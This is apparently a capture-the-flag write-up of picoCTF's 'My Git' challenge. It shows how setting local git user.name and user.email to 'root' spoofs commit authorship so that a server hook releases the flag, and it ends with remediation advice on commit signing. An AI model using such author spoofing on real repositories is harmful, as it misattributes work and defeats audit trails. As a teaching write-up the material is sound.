# CyLab 2026 – My Git Write-up

---

## Step 0 - Challenge Info
* **CTF Name:** picoCTF 2026
* **Challenge Name:** My Git
* **Category:** General Skills
* **Points:** 100
* **Date:** 9/11/2026
* **Flag:** `picoCTF{1mp3rs0n4t4_g17_345y_........}`

---

## TL;DR (Abstract)
The challenge provides a remote Git repository that enforces a server-side hook validating the commit author's identity and file contents before granting access to the flag. Because Git client configuration metadata is completely user-controlled, an attacker can modify local configuration parameters (`user.name` and `user.email`) to spoof identity. By configuring the local Git client as `root`, creating `flag.txt`, committing the changes, and pushing them to the remote tracking branch, the remote validation hook triggered, successfully recognized the impersonated author, and returned the challenge flag.

---

## Challenge Description
> Can you demonstrate your understanding of Git metadata and commit identity? Interact with the remote repository, meet the commit criteria as an authorized user, and push your changes to capture the flag.[cite: 7]

---

## Thought Process & Walkthrough

### 1. Initial Reconnaissance
Clone or navigate into the provided local Git challenge workspace:

```bash
cd ~/challenge
```

The server requires a commit containing `flag.txt` authored specifically by the `root` user (`root@picoctf`).

### 2. Impersonating the Authorized Author
Git commit author metadata relies entirely on local configuration directives and does not inherently cryptographically prove user identity unless commit signing (GPG/SSH) is explicitly verified. Configure the local repository settings to impersonate `root`:

```bash
git config user.name "root"
git config user.email "root@picoctf"
```

### 3. Creating & Committing the Required File
Create the required `flag.txt` file, stage it to the index, and create the commit:

```bash
echo "requesting flag" > flag.txt
git add flag.txt
git commit -m "push flag.txt as root"
```

The local branch generates the commit under the spoofed author credentials:

```text
[master 88b2171] push flag.txt as root
 1 file changed, 1 insertion(+)
 create mode 100644 flag.txt
```

### 4. Pushing Changes & Flag Capture
Push the newly authored commit to the remote tracking repository:

```bash
git push
```

The remote server executes its pre-receive or update hook to evaluate the incoming commit metadata. The hook matches the spoofed author identity, verifies the existence of `flag.txt`, and emits the flag into the terminal session:

```text
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 12 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 288 bytes | 288.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0)
remote: Author matched and flag.txt found in commit...
remote: Congratulations! You have successfully impersonated the root user
remote: Here's your flag: picoCTF{1mp3rs0n4t4_g17_345y_........}
To ssh://foggy-cliff.picoctf.net:49305/git/challenge.git
   293d811..88b2171  master -> master
```

---

## Remediation & Key Takeaways
* **Git Metadata is Trivially Spoofed:** Standard `user.name` and `user.email` configurations are client-asserted fields and must never be treated as trusted authentication boundaries.[cite: 7]
* **Require Cryptographic Signatures:** Implement mandatory GPG or SSH commit signing (`git commit -S`) and enforce server-side hooks that reject unsigned or untrusted commits.[cite: 7]
* **Authentication vs. Author Identity:** Rely on authenticated transport credentials (SSH keys, personal access tokens) rather than commit headers when making authorization decisions on server-side hooks.[cite: 7]
